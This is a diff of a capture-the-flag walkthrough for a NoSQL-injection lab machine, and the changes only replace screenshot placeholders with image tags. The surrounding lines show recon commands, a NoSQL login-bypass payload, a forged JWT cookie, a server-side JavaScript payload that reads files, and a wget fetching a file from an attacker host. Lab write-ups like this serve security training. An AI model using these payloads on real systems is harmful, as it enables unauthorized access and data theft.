@@ -16,7 +16,7 @@ _What's there to inject when there's no SQL?_
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="287" alt="SCREEN01" src="https://github.com/user-attachments/assets/e7889cf6-b203-471f-b616-3102b29f42df" />
 
 2. Use gobuster to discover hidden directories and files
 
@@ -24,7 +24,7 @@ nmap <TARGET_IP>
 gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-[SCREEN02]
+<img width="722" height="410" alt="SCREEN02" src="https://github.com/user-attachments/assets/dbba1555-def0-43d0-b087-d3e21fd49cb0" />
 
 3. Navigate to `http://<TARGET_IP>/admin` and examine the page source. In the JavaScript code, we find a hint for injection vulnerability
 
@@ -69,11 +69,11 @@ Content-Type: application/json
 {"username":"dave","password":{"$ne":""}}
 ```
 
-[SCREEN04]
+<img width="1032" height="384" alt="SCREEN04" src="https://github.com/user-attachments/assets/dac9b5db-d866-49ff-ac0d-e4a346c144dd" />
 
 5. After successful injection, the server responds with a JWT token. Decode this token using [CyberChef](https://gchq.github.io/CyberChef/) or any JWT decoder to extract the payload. The decoded payload reveals the first flag and Dave's actual password
 
-[SCREEN05]
+<img width="1676" height="670" alt="SCREEN05" src="https://github.com/user-attachments/assets/9c376872-0b52-4eda-9089-4019e1dbb7f4" />
 
 ---
 
@@ -94,7 +94,7 @@ Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI
 {"exec":"require('fs').readFileSync('/home/dave/user.txt')"}
 ```
 
-[SCREEN06]
+<img width="828" height="356" alt="SCREEN06" src="https://github.com/user-attachments/assets/c2dd9fa6-05ad-4366-8ecf-b27e6d3940da" />
 
 ---
 
@@ -138,7 +138,7 @@ show tables
 db.whatcouldthisbes.find()
 ```
 
-[SCREEN09]
+<img width="723" height="435" alt="SCREEN09" src="https://github.com/user-attachments/assets/940b25f1-166e-4e1c-8a74-22ee2f59b966" />
 
 ---
 
@@ -151,7 +151,7 @@ db.whatcouldthisbes.find()
 sudo -l
 ```
 
-[SCREEN07]
+<img width="721" height="159" alt="SCREEN07" src="https://github.com/user-attachments/assets/0309f1ab-3a62-4f55-be1e-a27ba7fdfa0c" />
 
 2. The `strings` command reveals hardcoded text including the fourth flag embedded in the binary
 
@@ -159,7 +159,7 @@ sudo -l
 strings /uid_checker
 ```
 
-[SCREEN08]
+<img width="721" height="433" alt="SCREEN08" src="https://github.com/user-attachments/assets/d0ec6360-a979-48c7-8152-8e72ac5acb5e" />
 
 ---
 
@@ -227,4 +227,4 @@ wget http://<ATTACKER_IP>:8000/in.txt
 cat /root/root.txt
 ```
 
-[SCREEN10]
+<img width="720" height="180" alt="SCREEN10" src="https://github.com/user-attachments/assets/4ce00023-b9cc-4743-9a79-e79dc9efa805" />
